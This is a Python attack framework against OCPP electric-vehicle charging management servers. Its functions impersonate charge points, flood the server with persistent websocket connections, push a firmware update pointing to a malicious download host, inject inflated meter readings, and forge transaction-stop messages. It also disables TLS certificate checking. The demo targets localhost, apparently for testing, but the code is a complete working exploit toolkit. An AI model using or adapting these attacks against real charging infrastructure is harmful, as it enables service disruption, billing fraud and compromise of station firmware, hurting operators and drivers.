import asyncio
import websockets
import json
import ssl
from uuid import uuid4
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.panel import Panel

console = Console()

class OCPPAttackFramework:
    def __init__(self, target_url: str, ocpp_version: str):
        self.target_url = target_url
        self.ocpp_version = ocpp_version
        self.ssl_context = None
        if ocpp_version == "2.0.1":
            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE

    def _get_protocol(self) -> str:
        return "ocpp1.6" if self.ocpp_version == "1.6" else "ocpp2.0.1"

    async def _send_message(self, message, cp_id=None, timeout=2):
        try:
            # Use provided cp_id or generate a unique one
            cp_id = cp_id or f"CP_{uuid4().hex[:8]}"
            ws_url = self.target_url.rsplit("/", 1)[0] + f"/{cp_id}"
            ws = await websockets.connect(
                ws_url,
                ssl=self.ssl_context,
                subprotocols=[self._get_protocol()]
            )
            await ws.send(json.dumps(message))
            console.print(f"[bold green]✓[/] Sent: {json.dumps(message, indent=2)}")
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=timeout)
                console.print(f"[bold blue]←[/] Response: {response}")
            except asyncio.TimeoutError:
                console.print("[yellow]No response received[/]")
            return ws  # Return the connection to keep it open
        except (websockets.exceptions.ConnectionClosedError, ConnectionRefusedError, asyncio.TimeoutError) as e:
            console.print(f"[bold red]✗ Connection Error: {str(e)}[/]")
            return None
        except Exception as e:
            console.print(f"[bold red]✗ Unexpected Error: {str(e)}[/]")
            return None

    async def impersonate_cp(self):
        if self.ocpp_version == "1.6":
            message = [
                2,
                str(uuid4()),
                "BootNotification",
                {
                    "chargePointVendor": "EvilCorp",
                    "chargePointModel": "VirusX"
                }
            ]
        else:
            message = [
                2,
                str(uuid4()),
                "BootNotification",
                {
                    "reason": "PowerUp",
                    "chargingStation": {
                        "vendorName": "EvilCorp",
                        "model": "VirusX",
                        "serialNumber": "SN-666"
                    }
                }
            ]
        await self._send_message(message)

    async def dos_attack(self, count=100):
        with Progress() as progress:
            task = progress.add_task("[red]Flooding with open connections...", total=count)
            connections = []
            for i in range(count):
                if self.ocpp_version == "1.6":
                    message = [
                        2,
                        str(uuid4()),
                        "BootNotification",
                        {
                            "chargePointVendor": "EvilCorp",
                            "chargePointModel": "VirusX"
                        }
                    ]
                else:
                    message = [
                        2,
                        str(uuid4()),
                        "Heartbeat",
                        {}
                    ]
                ws = await self._send_message(message)
                if ws:
                    connections.append(ws)
                progress.update(task, advance=1)
                await asyncio.sleep(0.05)  # Faster flooding

            # Keep connections alive by sending Heartbeat messages
            console.print("[bold yellow]Keeping connections open for 30 seconds with Heartbeats...[/]")
            for _ in range(6):  # Send Heartbeats every 5 seconds for 30 seconds
                for ws in connections[:]:  # Copy to avoid modifying while iterating
                    try:
                        if self.ocpp_version == "1.6":
                            heartbeat = [2, str(uuid4()), "Heartbeat", {}]
                        else:
                            heartbeat = [2, str(uuid4()), "Heartbeat", {}]
                        await ws.send(json.dumps(heartbeat))
                        console.print(f"[bold green]✓[/] Sent Heartbeat")
                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        console.print(f"[bold blue]←[/] Heartbeat Response: {response}")
                    except (websockets.exceptions.ConnectionClosed, asyncio.TimeoutError):
                        console.print("[yellow]Connection closed or no response[/]")
                        connections.remove(ws)
                await asyncio.sleep(5)

            # Close all remaining connections
            for ws in connections:
                try:
                    await ws.close()
                except:
                    pass
            console.print("[bold green]All connections closed[/]")

    async def malicious_firmware_update(self):
        if self.ocpp_version == "1.6":
            message = [
                2,
                str(uuid4()),
                "UpdateFirmware",
                {
                    "location": "http://malicious.local/firmware.exe",
                    "retrieveDate": "2030-01-01T00:00:00Z"
                }
            ]
        else:
            message = [
                2,
                str(uuid4()),
                "UpdateFirmware",
                {
                    "firmware": {
                        "location": "http://malicious.local/firmware.bin",
                        "retrieveDate": "2030-01-01T00:00:00Z"
                    },
                    "requestId": 666
                }
            ]
        # Use longer timeout for firmware update due to 30s delay
        ws = await self._send_message(message, timeout=35)
        if ws:
            await ws.close()

    async def poison_meter_values(self):
        if self.ocpp_version == "1.6":
            message = [
                2,
                str(uuid4()),
                "MeterValues",
                {
                    "connectorId": 1,
                    "transactionId": 1,
                    "meterValue": [{
                        "timestamp": "2025-05-07T16:15:00Z",
                        "sampledValue": [{"value": "999999999", "unit": "Wh"}]
                    }]
                }
            ]
        else:
            message = [
                2,
                str(uuid4()),
                "TransactionEvent",
                {
                    "eventType": "Updated",
                    "timestamp": "2025-05-07T16:15:00Z",
                    "transactionInfo": {
                        "transactionId": "1",
                        "chargingState": "Charging"
                    },
                    "meterValue": [{
                        "timestamp": "2025-05-07T16:15:00Z",
                        "sampledValue": [{"value": "999999999", "unit": "Wh"}]
                    }]
                }
            ]
        ws = await self._send_message(message, cp_id="CP_1")
        if ws:
            await ws.close()

    async def transaction_hijack(self):
        if self.ocpp_version == "1.6":
            message = [
                2,
                str(uuid4()),
                "StopTransaction",
                {
                    "transactionId": 999,
                    "timestamp": "2025-01-01T00:00:00Z",
                    "meterStop": 0,
                    "idTag": "RFID_123"
                }
            ]
        else:
            message = [
                2,
                str(uuid4()),
                "TransactionEvent",
                {
                    "eventType": "Ended",
                    "timestamp": "2025-01-01T00:00:00Z",
                    "transactionInfo": {
                        "transactionId": "999",
                        "chargingState": "Completed"
                    },
                    "idTag": {"idToken": "RFID_123"}
                }
            ]
        ws = await self._send_message(message)
        if ws:
            await ws.close()

async def main():
    console.print(Panel("[bold]OCPP Attack Framework[/]", style="bold magenta"))
    
    attacker_16 = OCPPAttackFramework(
        target_url="ws://localhost:9000/CP_1",
        ocpp_version="1.6"
    )
    console.print("[bold cyan]Executing Impersonation Attack[/]")
    await attacker_16.impersonate_cp()
    console.print("[bold cyan]Executing Transaction Hijack Attack[/]")
    await attacker_16.transaction_hijack()
    console.print("[bold cyan]Executing Denial of Service Attack[/]")
    await attacker_16.dos_attack(count=10)
    console.print("[bold cyan]Executing Malicious Firmware Update Attack[/]")
    await attacker_16.malicious_firmware_update()
    console.print("[bold cyan]Executing Data Poisoning Attack[/]")
    await attacker_16.poison_meter_values()

if __name__ == "__main__":
    asyncio.run(main())